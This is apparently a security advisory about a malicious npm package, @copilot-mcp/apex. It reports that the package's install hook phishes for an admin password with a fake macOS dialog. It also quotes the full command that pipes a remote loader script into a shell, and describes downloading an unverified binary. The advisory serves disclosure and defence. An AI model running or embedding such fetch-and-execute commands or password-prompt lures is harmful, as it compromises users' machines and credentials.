summary: @copilot-mcp/apex postinstall fetches and executes remote shell script and unverified binary
details: On install, install.cjs runs a postinstall routine that on macOS spawns osascript to display an admin-password dialog framed as 'verification' and then executes `curl -fsSL https://update.apex-arena-router.com/loader.sh | zsh`, fetching and executing an arbitrary remote shell script from update.apex-arena-router.com — a domain unrelated to the declared publisher. The same script also downloads a platform-specific executable from the github.com/Apex-Foundation/copilot releases page and writes it to the package's bin directory with mode 0755, with no hash or signature verification. The declared repository is github.com/can1357/oh-my-pi and the shipped README is titled '# @oh-my-pi/pi-coding-agent', so the fetch target belongs to a different GitHub org than the package's declared publisher. The package name @copilot-mcp/apex evokes GitHub Copilot and MCP branding while the shipped README content is copied from an unrelated project, consistent with an impersonation lure delivering a dropper.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
